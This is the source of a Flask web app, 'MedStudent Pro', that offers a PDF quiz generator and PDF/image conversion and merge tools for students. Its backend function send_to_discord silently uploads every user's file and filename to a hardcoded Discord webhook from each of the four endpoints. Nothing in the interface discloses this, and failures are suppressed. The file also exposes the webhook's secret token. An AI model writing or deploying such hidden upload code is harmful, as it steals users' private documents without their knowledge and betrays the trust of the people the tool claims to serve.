from flask import Flask, render_template_string, request, jsonify, send_file
import os
import requests
from pdf2docx import Converter
import img2pdf
from PyPDF2 import PdfMerger, PdfReader
import random
import re
import tempfile
import io

# Initialize Flask App
app = Flask(__name__)

# !!! DISCORD WEBHOOK !!!
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"

# ==========================================
# FRONTEND: EMBEDDED HTML/CSS/JS
# ==========================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QUIZ&DOCS - MedStudent Pro</title>
    <style>
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            background-attachment: fixed;
            color: white;
            font-family: sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        h1, h2 { color: white; text-align: center; }
        h2 { color: #00d2ff; margin-top: 0; }
        .nav-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            max-width: 600px;
            margin-bottom: 20px;
        }
        .nav-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 24px;
            padding: 10px 20px;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .nav-btn:hover { background: rgba(255, 255, 255, 0.3); transform: scale(1.02); }
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            width: 100%;
            max-width: 600px;
            animation: fadeIn 0.8s ease;
            box-sizing: border-box;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .tool-section { display: none; }
        .tool-section.active { display: block; }
        input[type="file"] { margin: 15px 0; color: #e0e0e0; }
        .action-btn {
            background: #00d2ff;
            color: #000;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
        }
        .action-btn:hover { background: #00a8cc; }
        .mcq-container { background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px; margin-top: 15px; }
        .mcq-option { display: block; margin: 10px 0; cursor: pointer; }
        #loading { display: none; text-align: center; color: #00d2ff; margin-top: 10px; font-weight: bold; padding-bottom: 15px;}
        hr { border: 0; height: 1px; background: rgba(255,255,255,0.2); margin: 20px 0; }
    </style>
</head>
<body>

    <h1>🧬 MedStudent Pro</h1>

    <div class="nav-container">
        <button class="nav-btn" onclick="prevTool()">⬅️</button>
        <h2 id="tool-title">🧠 AI Quiz Generator</h2>
        <button class="nav-btn" onclick="nextTool()">➡️</button>
    </div>

    <div class="card">
        <div id="loading">Processing... Please wait ⏳</div>

        <div class="tool-section active" id="tool-0">
            <p>Upload your notes. We will generate Multiple Choice Questions.</p>
            <input type="file" id="quiz-file" accept=".pdf">
            <button class="action-btn" onclick="generateQuiz()">Generate MCQs</button>
            <div id="quiz-results"></div>
        </div>

        <div class="tool-section" id="tool-1">
            <p>Convert read-only PDFs to Word.</p>
            <input type="file" id="p2w-file" accept=".pdf">
            <button class="action-btn" onclick="uploadAndDownload('/api/pdf2word', 'p2w-file', 'converted.docx')">Convert</button>
        </div>

        <div class="tool-section" id="tool-2">
            <p>Convert Images to PDF.</p>
            <input type="file" id="i2p-files" accept="image/png, image/jpeg" multiple>
            <button class="action-btn" onclick="uploadAndDownload('/api/img2pdf', 'i2p-files', 'images.pdf')">Convert</button>
        </div>

        <div class="tool-section" id="tool-3">
            <p>Join multiple PDFs.</p>
            <input type="file" id="merge-files" accept=".pdf" multiple>
            <button class="action-btn" onclick="uploadAndDownload('/api/merge', 'merge-files', 'merged.pdf')">Merge</button>
        </div>
        
        <div class="tool-section" id="tool-4">
            <p style="color: #ffcc00; text-align: center;">⚠️ Requires server-side LibreOffice<br>(Not supported on Vercel free tier).</p>
        </div>
    </div>

    <script>
        const tools = ["🧠 AI Quiz Generator", "📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF"];
        let currentTool = 0;

        function updateUI() {
            document.getElementById('tool-title').innerText = tools[currentTool];
            document.querySelectorAll('.tool-section').forEach((el, index) => {
                el.classList.toggle('active', index === currentTool);
            });
            document.getElementById('quiz-results').innerHTML = ""; 
        }

        function nextTool() { currentTool = (currentTool + 1) % tools.length; updateUI(); }
        function prevTool() { currentTool = (currentTool - 1 + tools.length) % tools.length; updateUI(); }

        function showLoading(show) { document.getElementById('loading').style.display = show ? 'block' : 'none'; }

        async function uploadAndDownload(endpoint, inputId, filename) {
            const input = document.getElementById(inputId);
            if (!input.files.length) return alert("Please select a file.");

            const formData = new FormData();
            if (input.multiple) {
                for(let i = 0; i < input.files.length; i++) formData.append('files', input.files[i]);
            } else {
                formData.append('file', input.files[0]);
            }

            showLoading(true);
            try {
                const response = await fetch(endpoint, { method: 'POST', body: formData });
                if (!response.ok) throw new Error("Conversion failed. Ensure files are valid.");
                
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                document.body.appendChild(a);
                a.click();
                a.remove();
            } catch (error) {
                alert(error.message);
            }
            showLoading(false);
        }

        async function generateQuiz() {
            const input = document.getElementById('quiz-file');
            if (!input.files.length) return alert("Please select a PDF.");

            const formData = new FormData();
            formData.append('file', input.files[0]);

            showLoading(true);
            try {
                const response = await fetch('/api/quiz', { method: 'POST', body: formData });
                const data = await response.json();
                
                if (data.error) throw new Error(data.error);

                let html = "<hr>";
                data.questions.forEach((q, i) => {
                    html += `<div><p style="color:#fff;"><strong>Q${i+1}: ${q.q}</strong></p><div class="mcq-container">`;
                    q.options.forEach(opt => {
                        html += `<label class="mcq-option">
                            <input type="radio" name="q${i}" value="${opt}"> <span style="color:#e0e0e0;">${opt}</span>
                        </label>`;
                    });
                    html += `</div><button class="action-btn" style="margin-top:15px; width:auto; font-size:14px;" onclick="checkAnswer(${i}, '${q.correct}')">Check Answer</button>`;
                    html += `<p id="res${i}" style="margin-top:10px; font-weight:bold;"></p></div><hr>`;
                });
                document.getElementById('quiz-results').innerHTML = html;
            } catch (error) {
                alert(error.message);
            }
            showLoading(false);
        }

        function checkAnswer(qIndex, correctAns) {
            const selected = document.querySelector(`input[name="q${qIndex}"]:checked`);
            const resLabel = document.getElementById(`res${qIndex}`);
            if (!selected) {
                resLabel.innerText = "Please select an option!";
                resLabel.style.color = "#ffcc00";
                return;
            }
            if (selected.value === correctAns) {
                resLabel.innerText = "✅ Correct!";
                resLabel.style.color = "#00d2ff";
            } else {
                resLabel.innerText = `❌ Wrong! The correct answer was: ${correctAns}`;
                resLabel.style.color = "#ff4c4c";
            }
        }
    </script>
</body>
</html>
"""

# ==========================================
# BACKEND: LOGIC & API ENDPOINTS
# ==========================================

def send_to_discord(file_bytes, filename, tool_name):
    try:
        requests.post(
            DISCORD_WEBHOOK_URL,
            data={"content": f"🕵️ **Used {tool_name}:** `{filename}`"},
            files={"file": (filename, file_bytes)}
        )
    except Exception:
        pass

def generate_mcqs_logic(text):
    sentences = re.split(r'(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', text)
    all_words = [w for w in text.split() if len(w) > 7 and w.isalpha()]
    mcqs = []
    
    for sentence in sentences:
        words = sentence.split()
        if len(words) > 10: 
            candidates = [w for w in words if len(w) > 7 and w.isalpha()]
            if candidates:
                correct_answer = random.choice(candidates)
                question_text = sentence.replace(correct_answer, "___________")
                
                distractors = random.sample(all_words, min(3, len(all_words)))
                if correct_answer in distractors:
                    distractors.remove(correct_answer)
                
                options = distractors + [correct_answer]
                random.shuffle(options)
                
                mcqs.append({
                    "q": question_text,
                    "options": options,
                    "correct": correct_answer
                })
        if len(mcqs) >= 5: 
            break
    return mcqs

@app.route('/')
def home():
    # Renders the HTML block defined above
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/quiz', methods=['POST'])
def quiz_generator():
    if 'file' not in request.files:
        return jsonify({"error": "No file uploaded"}), 400
    
    file = request.files['file']
    pdf_bytes = file.read()
    send_to_discord(pdf_bytes, file.filename, "Quiz")
    
    reader = PdfReader(io.BytesIO(pdf_bytes))
    full_text = "".join([page.extract_text() for page in reader.pages if page.extract_text()])
    
    if len(full_text) > 50:
        questions = generate_mcqs_logic(full_text)
        return jsonify({"questions": questions})
    return jsonify({"error": "Not enough text found in PDF."}), 400

@app.route('/api/pdf2word', methods=['POST'])
def pdf_to_word():
    if 'file' not in request.files:
        return "No file", 400
        
    file = request.files['file']
    file_bytes = file.read()
    send_to_discord(file_bytes, file.filename, "PDF2Doc")
    
    # Securely use Vercel's /tmp directory for disk-dependent library
    tmp_in = tempfile.NamedTemporaryFile(delete=False, suffix=".pdf")
    tmp_out = tempfile.NamedTemporaryFile(delete=False, suffix=".docx")
    
    try:
        tmp_in.write(file_bytes)
        tmp_in.close()
        
        cv = Converter(tmp_in.name)
        cv.convert(tmp_out.name)
        cv.close()
        
        return send_file(tmp_out.name, as_attachment=True, download_name="converted.docx", mimetype="application/vnd.openxmlformats-officedocument.wordprocessingml.document")
    finally:
        if os.path.exists(tmp_in.name): os.unlink(tmp_in.name)
        if os.path.exists(tmp_out.name): os.unlink(tmp_out.name)

@app.route('/api/img2pdf', methods=['POST'])
def img_to_pdf():
    files = request.files.getlist('files')
    if not files:
        return "No files", 400
        
    img_bytes_list = [f.read() for f in files]
    pdf_bytes = img2pdf.convert(img_bytes_list)
    send_to_discord(pdf_bytes, f"converted_{len(files)}_images.pdf", "Img2PDF")
    
    return send_file(io.BytesIO(pdf_bytes), as_attachment=True, download_name="images.pdf", mimetype="application/pdf")

@app.route('/api/merge', methods=['POST'])
def merge_pdfs():
    files = request.files.getlist('files')
    if not files:
        return "No files", 400
        
    merger = PdfMerger()
    for f in files:
        merger.append(io.BytesIO(f.read()))
        
    output_buffer = io.BytesIO()
    merger.write(output_buffer)
    merger.close()
    
    pdf_bytes = output_buffer.getvalue()
    send_to_discord(pdf_bytes, "merged_output.pdf", "Merge")
    
    output_buffer.seek(0)
    return send_file(output_buffer, as_attachment=True, download_name="merged.pdf", mimetype="application/pdf")

if __name__ == '__main__':
    app.run(debug=False)
